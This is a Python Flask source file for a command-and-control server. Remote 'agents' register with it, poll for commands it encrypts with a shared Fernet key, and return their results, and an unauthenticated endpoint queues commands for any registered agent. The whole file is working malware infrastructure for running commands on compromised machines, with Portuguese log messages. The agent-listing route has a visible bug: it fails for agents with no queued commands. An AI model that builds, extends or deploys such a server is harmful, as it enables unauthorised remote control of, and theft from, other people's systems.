from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import datetime
import os

from dotenv import load_dotenv
load_dotenv()

app = Flask(__name__)
KEY = os.getenv("C2_SHARED_KEY")

if not KEY:
    raise RuntimeError("C2_SHARED_KEY não definida")

fernet = Fernet(KEY.encode())

agents = {}  # {agent_id: {'last_seen': timestamp, 'results': []}}
commands = {}  # {agent_id:['cmd1','cmd2']}

def log_event(event):
    with open('c2_log.txt','a') as f:
        f.write(f"{datetime.datetime.now()} — {event}\n")

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json(silent=True) or {}
    agent_id = data.get('agent_id', os.urandom(16).hex())
    agents[agent_id] = {'last_seen': datetime.datetime.now(), 'results': []}
    log_event(f"Registered: {agent_id}")
    return jsonify({'agent_id': agent_id})


@app.route('/getcommand', methods=['GET'])
def get_command():
    agent_id = request.headers.get('Agent-id')
    if agent_id in agents:
        agents[agent_id]['last_seen'] = datetime.datetime.now()
        if commands.get(agent_id):
            cmd = commands[agent_id].pop(0)
            enc_cmd = fernet.encrypt(cmd.encode()).decode()
            return jsonify({'command': enc_cmd})
    return jsonify({'command': None})

@app.route('/submit_result', methods=['POST'])
def submit_result():
    agent_id = request.headers.get('Agent-id')
    data = request.get_json()
    if agent_id in agents:
        agents[agent_id]['results'].append(data['result'])
        log_event(f"Resultado de {agent_id}: {data['result'][:100]}")
    return jsonify({'status': 'ok'})

@app.route('/sendcommand', methods=['POST'])
def send_command():
    data = request.get_json()
    agent_id = data['agent_id']
    cmd = data['command']
    if agent_id in agents:
        commands.setdefault(agent_id, []).append(cmd)
        log_event(f"Comando enviado para {agent_id}: {cmd}")
        return jsonify({'status': 'enqueued'})
    return jsonify({'status': 'agent_not_found'}), 404

@app.route("/agents", methods=["GET"])
def list_agents():
    return jsonify({
        aid: {
            "last_seen": str(info["last_seen"]),
            "results": len(info["results"]),
            "queue": len(commands[aid])
        }
        for aid, info in agents.items()
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

